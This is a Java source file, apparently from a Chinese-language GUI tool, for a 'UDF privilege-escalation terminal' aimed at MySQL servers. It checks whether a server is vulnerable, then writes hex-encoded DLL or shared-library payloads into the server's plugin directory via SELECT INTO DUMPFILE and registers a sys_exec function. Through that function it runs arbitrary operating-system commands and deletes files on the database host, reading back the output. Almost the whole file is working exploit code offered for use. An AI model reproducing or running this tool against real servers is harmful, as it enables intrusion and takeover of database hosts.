package com.ning.Controller;

import com.ning.Model.initButtonMonitorAndConnection;
import javafx.fxml.FXML;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.input.KeyCode;
import javafx.scene.input.KeyEvent;
import javafx.scene.layout.VBox;

import java.io.*;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.sql.*;
import java.util.*;
import java.util.concurrent.CopyOnWriteArrayList;

public class udfController {
    @FXML
    private VBox udfContainer;
    @FXML
    private TextArea terminalOutput;
    @FXML
    private TextField commandInput;

    private final List<String> commandHistory = new ArrayList<>();
    private final List<String> tempFiles = new CopyOnWriteArrayList<>();
    private int historyIndex = -1;
    private String currentDir = System.getProperty("user.dir");
    private boolean isWindows = System.getProperty("os.name").contains("Win");
    private Boolean canUseUDF = null; // 缓存UDF检查结果
    private String currentUDFPath = null; // 当前UDF文件路径

    // 编码处理
    //private static final Charset GBK_CHARSET = Charset.forName("GBK");
    //private static final Charset UTF8_CHARSET = StandardCharsets.UTF_8;

    // UDF十六进制数据
    private String udfWin32Hex;
    private String udfWin64Hex;
    private String udfLinux32Hex;
    private String udfLinux64Hex;

    public void shutdown() {
        cleanupAllResources();
    }

    private void cleanupAllResources() {
        try {
            cleanupAllTempFiles();
            dropUDFFunction();
        } catch (SQLException e) {
            System.err.println("资源清理失败: " + e.getMessage());
        }
    }

    @FXML
    public void initialize() {
        setupTerminal();
        setupCommandInput();
        printWelcomeMessage();
        loadUdfHexData();

        // 注册关闭钩子
        //Runtime.getRuntime().addShutdownHook(new Thread(this::cleanupAllResources));
    }

    private void loadUdfHexData() {
        udfWin32Hex = readUdfHexFromResource("/udfHome/udf_win32_hex.txt");
        udfWin64Hex = readUdfHexFromResource("/udfHome/udf_win64_hex.txt");
        udfLinux32Hex = readUdfHexFromResource("/udfHome/udf_linux32_hex.txt");
        udfLinux64Hex = readUdfHexFromResource("/udfHome/udf_linux64_hex.txt");

        if (udfWin32Hex == null || udfWin64Hex == null ||
                udfLinux32Hex == null || udfLinux64Hex == null) {
            appendOutput("警告: 部分UDF十六进制数据加载失败\n");
        }
    }

    private String readUdfHexFromResource(String resourcePath) {
        try (InputStream is = getClass().getResourceAsStream(resourcePath);
             BufferedReader reader = new BufferedReader(new InputStreamReader(is))) {
            StringBuilder content = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line.trim());
            }
            return content.toString();
        } catch (IOException | NullPointerException e) {
            appendOutput("错误: 无法读取资源文件 - " + resourcePath + "\n");
            return null;
        }
    }

    private void setupTerminal() {
        terminalOutput.setEditable(false);
        terminalOutput.setWrapText(true);
    }

    private void setupCommandInput() {
        commandInput.setOnKeyPressed(this::handleCommandInputKeyPress);
    }

    private void printWelcomeMessage() {
        appendOutput("UDF 提权终端v1.0\n");
        appendOutput("输入 'help' 查看可用命令\n\n");
    }

    private void appendOutput(String text) {
        terminalOutput.appendText(text);
    }

    private void handleCommandInputKeyPress(KeyEvent event) {
        if (event.getCode() == KeyCode.ENTER) {
            String command = commandInput.getText().trim();
            if (!command.isEmpty()) {
                executeCommand(command);
                commandHistory.add(command);
                historyIndex = commandHistory.size();
            }
            commandInput.clear();
            event.consume();
        } else if (event.getCode() == KeyCode.UP) {
            navigateHistory(-1);
            event.consume();
        } else if (event.getCode() == KeyCode.DOWN) {
            navigateHistory(1);
            event.consume();
        }
    }

    private void navigateHistory(int direction) {
        if (commandHistory.isEmpty()) return;

        historyIndex = Math.max(0, Math.min(commandHistory.size() - 1, historyIndex + direction));
        commandInput.setText(commandHistory.get(historyIndex));
        commandInput.end();
    }

    private void executeCommand(String command) {
        appendOutput("> " + command + "\n");

        if (command.equalsIgnoreCase("help")) {
            showHelp();
            return;
        }

        if (command.equalsIgnoreCase("clear") || command.equalsIgnoreCase("cls")) {
            terminalOutput.clear();
            printWelcomeMessage();
            return;
        }

        if (command.equalsIgnoreCase("check")) {
            try {
                canUseUDF = checkUDFConditions(); // 更新缓存
                appendOutput(canUseUDF ? "满足UDF提权条件\n" : "不满足UDF提权条件\n");
            } catch (SQLException e) {
                appendOutput("检查错误: " + e.getMessage() + "\n");
            }
            return;
        }

        String[] parts = command.split("\\s+");
        String cmd = parts[0].toLowerCase();

        try {
            switch (cmd) {
                case "execute":
                    handleExecuteCommand(parts);
                    break;
                case "shell":
                    handleShellCommand(parts);
                    break;
                case "sysinfo":
                    handleSysinfoCommand();
                    break;
                case "cd":
                    handleCdCommand(parts);
                    break;
                case "pwd":
                    appendOutput("当前目录: " + currentDir + "\n");
                    break;
                case "ls":
                case "dir":
                    handleListFilesCommand();
                    break;
                default:
                    appendOutput("未知命令: " + command + "\n");
            }
        } catch (Exception e) {
            appendOutput("错误: " + e.getMessage() + "\n");
        }
    }

    private void showHelp() {
        appendOutput("\n可用命令:\n");
        appendOutput("  help               - 显示帮助信息\n");
        appendOutput("  check              - 检查UDF提权条件\n");
        appendOutput("  execute <command>  - 执行系统命令\n");
        //appendOutput("  shell              - 获取交互式shell\n");
        appendOutput("  sysinfo            - 显示系统信息\n");
        appendOutput("  cd <path>          - 更改当前目录\n");
        appendOutput("  pwd                - 显示当前目录\n");
        appendOutput("  ls/dir             - 列出当前目录文件\n");
        appendOutput("  clear/cls          - 清屏\n\n");
    }

    private void handleExecuteCommand(String[] parts) throws SQLException {
        if (initButtonMonitorAndConnection.conn == null) {
            appendOutput("请先连接到数据库\n");
            return;
        }

        if (parts.length < 2) {
            appendOutput("用法: execute <command>\n");
            return;
        }

        // 检查UDF条件（使用缓存结果）
        if (canUseUDF == null) {
            canUseUDF = checkUDFConditions();
            if (!canUseUDF) {
                appendOutput("不满足UDF提权条件\n");
                return;
            }
        }

        String cmd = String.join(" ", Arrays.copyOfRange(parts, 1, parts.length));
        String outputFile = generateTempFilePath().replace("\\", "\\\\");

        try {
            if (createUDFFunction()) {
                String execCmd = cmd + " > " + outputFile + " 2>&1";
                executeSystemCommand(execCmd);
                String output = readCommandOutput(outputFile);
                appendOutput("命令执行结果:\n" + output + "\n");
            }
        } catch (FileNotFoundException e) {
            throw new RuntimeException(e);
        } finally {
            cleanupTempFile(outputFile);
            cleanupTempFile(dumpFilePath);
        }
    }

    private String generateTempFilePath() {
        String tempFile = (isWindows ? "C:\\Windows\\Temp\\" : "/tmp/") + "udf" + ".tmp";
        tempFiles.add(tempFile);
        return tempFile;
    }

    private void executeSystemCommand(String cmd) throws SQLException {
        try (Statement stmt = initButtonMonitorAndConnection.conn.createStatement()) {
            //cmd = cmd.replace("\\", "\\\\");
            String sql = "SELECT sys_exec('" + cmd.replace("'", "''") + "')";
            stmt.execute(sql);
        }
    }
    private String convertToGBK(String input) {
        if (input == null) return null;
        try {
            // 尝试 UTF-8 -> GBK
            return new String(input.getBytes(StandardCharsets.UTF_8), "GBK");
        } catch (UnsupportedEncodingException e1) {
            try {
                // 尝试 ISO-8859-1 -> GBK
                return new String(input.getBytes(StandardCharsets.ISO_8859_1), "GBK");
            } catch (UnsupportedEncodingException e2) {
                // 如果都不行，返回原字符串
                return input;
            }
        }
    }

    private String readCommandOutput(String filePath) throws FileNotFoundException {
        return readTempFile(filePath);
    }

    private String readTempFile(String filePath) {
        File file = new File(filePath);

        // 1. 自动检测文件编码并读取
        String content = readFileWithAutoEncoding(file);

        // 2. 清空文件
        try (FileWriter writer = new FileWriter(file, false)) {
            writer.write("");
        } catch (IOException e) {
            appendOutput("警告: 无法清空文件 - " + file.getAbsolutePath() + "\n");
        }

        return content;
    }

    private String readFileWithAutoEncoding(File file) {
        // 尝试常见编码（按优先级排序）
        Charset[] encodings = {
                StandardCharsets.UTF_8,
                Charset.forName("GBK"),
                StandardCharsets.ISO_8859_1,
                Charset.defaultCharset()
        };

        for (Charset encoding : encodings) {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(new FileInputStream(file), encoding))) {

                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line).append("\n");
                }

                // 检查是否包含典型乱码字符
                if (!containsGarbledText(sb.toString())) {
                    return sb.toString();
                }
            } catch (IOException e) {
                continue;
            }
        }

        throw new RuntimeException("无法确定文件编码: " + file.getAbsolutePath());
    }

    private boolean containsGarbledText(String text) {
        // 常见乱码字符检测
        return text.contains("��") || text.contains("å") || text.contains("æ") || text.contains("ï¿½");
    }

    private void cleanupTempFile(String filePath) throws SQLException {
        try (Statement stmt = initButtonMonitorAndConnection.conn.createStatement()) {
            String cmd = isWindows ?
                    "del /f /q \"" + filePath + "\"" :
                    "rm -f \"" + filePath + "\"";
            stmt.execute("SELECT sys_exec('" + cmd + "')");
            tempFiles.remove(filePath);
        }
    }

    private void cleanupAllTempFiles() throws SQLException {
        if (initButtonMonitorAndConnection.conn == null) return;

        try (Statement stmt = initButtonMonitorAndConnection.conn.createStatement()) {
            for (String file : tempFiles) {
                try {
                    String cmd = isWindows ?
                            "del /f /q \"" + file + "\"" :
                            "rm -f \"" + file + "\"";
                    stmt.execute("SELECT sys_exec('" + cmd + "')");
                } catch (SQLException e) {
                    System.err.println("删除临时文件失败: " + file);
                }
            }
            tempFiles.clear();
        }
    }

    private boolean createUDFFunction() throws SQLException {
        // 检查是否已存在函数
        try (Statement stmt = initButtonMonitorAndConnection.conn.createStatement();
             ResultSet rs = stmt.executeQuery("SELECT 1 FROM mysql.func WHERE name='sys_exec'")) {
            if (rs.next()) {
                //appendOutput("UDF函数已存在\n");
                return true;
            }
        }

        // 获取系统类型
        String osType = getOsType();
        boolean isWindows = osType.contains("Win");
        String udfHex = getUdfHexForSystem(osType);
        if (udfHex == null) {
            appendOutput("错误: 不支持的目标系统类型\n");
            return false;
        }

        // 获取插件目录并标准化路径
        String pluginDir = getPluginDir();
        if (pluginDir == null) {
            appendOutput("错误: 无法确定插件目录\n");
            return false;
        }

        // 确保路径以分隔符结尾
        if (!pluginDir.endsWith("/") && !pluginDir.endsWith("\\")) {
            pluginDir += isWindows ? "\\" : "/";
        }

        // 生成随机文件名并构建完整路径
        String randomStr = UUID.randomUUID().toString().substring(0, 3);
        String udfFilename = "mysqludf_" + randomStr + (isWindows ? ".dll" : ".so");
        String fullPath = pluginDir + udfFilename;

        try (Statement stmt = initButtonMonitorAndConnection.conn.createStatement()) {
            File pluginDirFile = new File(pluginDir);
            if (!pluginDirFile.exists()) {
                appendOutput("错误: 插件目录不存在: " + pluginDir + "\n");
                return false;
            }

            try (ResultSet rs = stmt.executeQuery("SHOW VARIABLES LIKE 'secure_file_priv'")) {
                if (rs.next()) {
                    String value = rs.getString(2);
                    if (value != null && !value.isEmpty() && !value.equals("NULL")) {
                        appendOutput("错误: secure_file_priv限制写入目录: " + value + "\n");
                        return false;
                    }
                }
            }

            String writeSql = "SELECT " + udfHex + " INTO DUMPFILE '" +
                    fullPath.replace("\\", "\\\\") + "'";
            stmt.execute(writeSql);
            appendOutput("UDF文件写入成功: " + fullPath + "\n");

            // 4. 设置文件权限（Linux）
            if (!isWindows) {
                stmt.execute("SELECT sys_exec('chmod 755 \"" + fullPath + "\"')");
            }

            // 5. 创建函数
            String funcName = "sys_exec";
            String createFuncSql = "CREATE FUNCTION " + funcName + " RETURNS STRING SONAME '" + udfFilename + "'";
            stmt.execute(createFuncSql);
            appendOutput("UDF函数创建成功，函数名: " + funcName + "\n");

            return true;
        } catch (SQLException e) {
            appendOutput("错误: 创建UDF函数失败 - " + e.getMessage() + "\n");

            // 详细错误诊断
            if (e.getMessage().contains("Errcode: 2")) {
                appendOutput("路径诊断:\n");
                appendOutput("1. 完整路径: " + fullPath + "\n");
                appendOutput("2. 目录是否存在: " + (new File(pluginDir).exists() ? "是" : "否") + "\n");
                appendOutput("3. 目录可写: " + (new File(pluginDir).canWrite() ? "是" : "否") + "\n");
            }
            return false;
        }
    }
    private String getOsType() throws SQLException {
        try (Statement stmt = initButtonMonitorAndConnection.conn.createStatement();
             ResultSet rs = stmt.executeQuery("SELECT @@version_compile_os")) {

            if (rs.next()) {
                return rs.getString(1);
            }
        }
        return "unknown";
    }

    private String getUdfHexForSystem(String osType) {
        if (osType.contains("Win")) {
            if (osType.contains("64")) {
                return udfWin64Hex != null ? udfWin64Hex : readUdfHexFromResource("/udfHome/udf_win64_hex.txt");
            } else {
                return udfWin32Hex != null ? udfWin32Hex : readUdfHexFromResource("/udfHome/udf_win32_hex.txt");
            }
        } else if (osType.contains("Linux")) {
            if (osType.contains("64")) {
                return udfLinux64Hex != null ? udfLinux64Hex : readUdfHexFromResource("/udfHome/udf_linux64_hex.txt");
            } else {
                return udfLinux32Hex != null ? udfLinux32Hex : readUdfHexFromResource("/udfHome/udf_linux32_hex.txt");
            }
        }
        appendOutput("错误: 不支持的操作系统类型 - " + osType + "\n");
        return null;
    }

    private void handleShellCommand(String[] parts) throws SQLException {
        if (initButtonMonitorAndConnection.conn == null) {
            appendOutput("请先连接到数据库\n");
            return;
        }

        appendOutput("正在获取交互式shell...\n");
        appendOutput("此功能需要根据目标环境配置\n");
    }

    private void handleSysinfoCommand() throws SQLException {
        if (initButtonMonitorAndConnection.conn == null) {
            appendOutput("请先连接到数据库\n");
            return;
        }

        try (Statement stmt = initButtonMonitorAndConnection.conn.createStatement();
             ResultSet rs = stmt.executeQuery(
                     "SELECT @@version, @@version_compile_os, current_user()")) {

            if (rs.next()) {
                appendOutput("\n系统信息:\n");
                appendOutput("  MySQL版本: " + rs.getString(1) + "\n");
                appendOutput("  操作系统: " + rs.getString(2) + "\n");
                appendOutput("  当前用户: " + rs.getString(3) + "\n\n");
            }
        }
    }

    private String getPluginDir() throws SQLException {
        try (Statement stmt = initButtonMonitorAndConnection.conn.createStatement();
             ResultSet rs = stmt.executeQuery("SHOW VARIABLES LIKE 'plugin_dir'")) {

            if (rs.next()) {
                return rs.getString(2);
            }
        }
        return null;
    }

    private boolean checkUDFConditions() throws SQLException {
        if (initButtonMonitorAndConnection.conn == null) {
            appendOutput("请先连接到数据库\n");
            return false;
        }

        // 1. 检查MySQL版本是否支持UDF
        if (!checkMySQLVersion()) {
            appendOutput("错误: MySQL版本不支持UDF提权\n");
            return false;
        }

        // 2. 检查secure_file_priv设置
        if (!checkSecureFilePriv()) {
            appendOutput("错误: secure_file_priv设置限制文件写入\n");
            return false;
        }

        // 3. 检查插件目录是否可写
        if (!checkPluginDirWritable()) {
            appendOutput("错误: 无法写入插件目录\n");
            return false;
        }

        // 4. 检查当前用户权限
        if (!checkUserPrivileges()) {
            appendOutput("错误: 当前用户权限不足\n");
            return false;
        }

        return true;
    }

    private boolean checkMySQLVersion() throws SQLException {
        try (Statement stmt = initButtonMonitorAndConnection.conn.createStatement();
             ResultSet rs = stmt.executeQuery("SELECT @@version")) {

            if (rs.next()) {
                String version = rs.getString(1);
                return !version.contains("8.0.") || version.compareTo("8.0.22") < 0;
            }
        }
        return false;
    }

    private boolean checkSecureFilePriv() throws SQLException {
        try (Statement stmt = initButtonMonitorAndConnection.conn.createStatement();
             ResultSet rs = stmt.executeQuery("SHOW VARIABLES LIKE 'secure_file_priv'")) {

            if (rs.next()) {
                String value = rs.getString(2);
                if(value == null || value.isEmpty()){
                    System.out.println("value"+value);
                    return true;
                }
            }
        }
        return false;
    }
    public String dumpFilePath;
    private boolean checkPluginDirWritable() throws SQLException {
        String pluginDir = getPluginDir();
        if (pluginDir == null) {
            return false;
        }

        // 获取操作系统类型
        String osType = getOsType();
        boolean isWindows = osType.contains("Win");

        // 标准化路径分隔符（确保路径以分隔符结尾）
        if (!pluginDir.endsWith("/") && !pluginDir.endsWith("\\")) {
            pluginDir += isWindows ? "\\" : "/";
        }

        // 创建测试文件名（统一使用正斜杠）
        String testFile = pluginDir.replace("\\", "/") + "test_" + System.currentTimeMillis() + ".tmp";

        try (Statement stmt = initButtonMonitorAndConnection.conn.createStatement()) {
            // 使用双重转义的反斜杠（Windows）或正斜杠（Linux）
            dumpFilePath = isWindows ?
                    testFile.replace("/", "\\\\") :
                    testFile;

            // 执行写入
            stmt.execute("SELECT 'test' INTO DUMPFILE '" + dumpFilePath + "'");

            // 验证文件
            try (ResultSet rs = stmt.executeQuery("SELECT length(load_file('" + dumpFilePath + "'))")) {
                if (rs.next() && rs.getInt(1) > 0) {
                    return true;
                }
            }
        } catch (SQLException e) {
            System.err.println("文件操作错误: " + e.getMessage());
            e.printStackTrace();
        }
        return false;
    }

    private boolean checkUserPrivileges() throws SQLException {
        try (Statement stmt = initButtonMonitorAndConnection.conn.createStatement();
             ResultSet rs = stmt.executeQuery(
                     "SELECT SUPER_PRIV, FILE_PRIV FROM mysql.user WHERE user = SUBSTRING_INDEX(CURRENT_USER(),'@',1)")) {

            if (rs.next()) {
                String superPriv = rs.getString(1);
                String filePriv = rs.getString(2);
                return "Y".equalsIgnoreCase(superPriv) && "Y".equalsIgnoreCase(filePriv);
            }
        }

        // 备选检查方案
        try (Statement stmt = initButtonMonitorAndConnection.conn.createStatement();
             ResultSet rs = stmt.executeQuery("SELECT 1 FROM mysql.func LIMIT 1")) {
            return true;
        } catch (SQLException e) {
            return false;
        }
    }

    private void handleCdCommand(String[] parts) {
        if (parts.length < 2) {
            appendOutput("当前目录: " + currentDir + "\n");
            return;
        }

        String newDir = parts[1];
        File dir = new File(newDir);

        if (!dir.isAbsolute()) {
            dir = new File(currentDir, newDir);
        }

        if (dir.exists() && dir.isDirectory()) {
            currentDir = dir.getAbsolutePath();
            appendOutput("当前目录: " + currentDir + "\n");
        } else {
            appendOutput("目录不存在: " + dir.getAbsolutePath() + "\n");
        }
    }

    private void handleListFilesCommand() {
        File dir = new File(currentDir);
        File[] files = dir.listFiles();

        if (files == null || files.length == 0) {
            appendOutput("目录为空\n");
            return;
        }

        appendOutput("\n目录内容:\n");
        for (File file : files) {
            appendOutput(String.format("  %-30s %s\n",
                    file.getName(),
                    file.isDirectory() ? "<DIR>" : file.length() + " bytes"));
        }
        appendOutput("\n");
    }

    private void dropUDFFunction() throws SQLException {
        if (initButtonMonitorAndConnection.conn == null) return;

        try (Statement stmt = initButtonMonitorAndConnection.conn.createStatement()) {
            //清理可能的UDF文件（需要知道文件名，这里简化处理）
            String pluginDir = getPluginDir();
            if (pluginDir != null) {
                pluginDir = pluginDir.replace("\\", "/");
                if (!pluginDir.endsWith("/")) pluginDir += "/";

                String cleanupCmd = isWindows ?
                        "del /f /q " + pluginDir + "mysqludf_*.dll" :
                        "rm -f " + pluginDir + "mysqludf_*.so";

                stmt.execute("SELECT sys_exec('" + cleanupCmd + "')");
            }
            stmt.execute("DROP FUNCTION IF EXISTS sys_exec");
        }
    }
}